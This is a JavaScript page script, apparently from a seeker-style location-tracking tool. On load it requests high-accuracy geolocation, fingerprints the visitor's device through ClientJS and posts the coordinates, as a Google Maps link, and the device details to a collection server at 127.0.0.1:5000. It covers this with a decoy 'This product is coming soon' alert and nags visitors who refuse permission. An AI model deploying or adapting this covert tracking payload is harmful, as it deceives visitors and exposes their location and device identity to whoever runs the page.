window.onload = function() {
    if (navigator.geolocation) {
        var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
        navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
    } else {
        alert('Geolocation is not supported by your browser...');
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;

        // Coleta dos dados do ClientJS
        var client = new ClientJS(); // Cria um novo objeto Client
        var OS = client.getOS(); // Obtém a versão do SO
        var ver = client.getOSVersion(); // Obtém a versão do SO
        var getbrow = client.getBrowser(); // Obtém o nome do navegador
        var getbrowVer = client.getBrowserVersion(); // Obtém a versão do navegador
        var CPU = client.getCPU(); // Obtém a arquitetura da CPU
        var currentResolution = client.getCurrentResolution(); // Obtém a resolução atual
        var timeZone = '';
        
        try {
            timeZone = client.getTimeZone(); // Obtém o fuso horário
        } catch {
            timeZone = 'Not Found';
        }

        timeZone = timeZone.toString();
        var language = client.getLanguage(); // Obtém o idioma do usuário
        var core = navigator.hardwareConcurrency; // Obtém o número de núcleos da CPU

        enviar(lat, lon, OS, ver, getbrow, getbrowVer, CPU, currentResolution, timeZone, language, core);
    }

    function enviar(lat, lon, OS, ver, getbrow, getbrowVer, CPU, currentResolution, timeZone, language, core) {
        $.ajax({
            type: 'POST',
            url: 'http://127.0.0.1:5000/location',
            data: JSON.stringify({
                "name": "John Doe",
                "data": `Google Map Link: https://google.com/maps/place/${lat}+${lon}`,
                "os": OS,
                "os_version": ver,
                "browser": getbrow,
                "browser_version": getbrowVer,
                "cpu": CPU,
                "resolution": currentResolution,
                "timezone": timeZone,
                "language": language,
                "core_count": core
            }),
            contentType: 'application/json; charset=UTF-8',
            success: function () { $('#change').html('Dados enviados com sucesso'); },
            error: function () { $('#change').html('Falha ao enviar os dados'); },
        });
        alert('Thank you for taking interest! This product is coming soon.');
    }

    function showError(error) {
        let errorMessage;
        switch (error.code) {
            case error.PERMISSION_DENIED:
                errorMessage = 'User denied the request for Geolocation';
                alert('Please refresh this page and allow location permission...');
                break;
            case error.POSITION_UNAVAILABLE:
                errorMessage = 'Location information is unavailable';
                break;
            case error.TIMEOUT:
                errorMessage = 'The request to get user location timed out';
                alert('Please set your location mode to High Accuracy...');
                break;
            case error.UNKNOWN_ERROR:
                errorMessage = 'An unknown error occurred';
                break;
        }

        $.ajax({
            type: 'POST',
            url: '/receive-error',
            data: JSON.stringify({ "error": errorMessage }),
            contentType: 'application/json; charset=UTF-8',
            success: function () { $('#change').html('Error received successfully'); },
            error: function () { $('#change').html('Failed to send error'); },
        });
    }
};
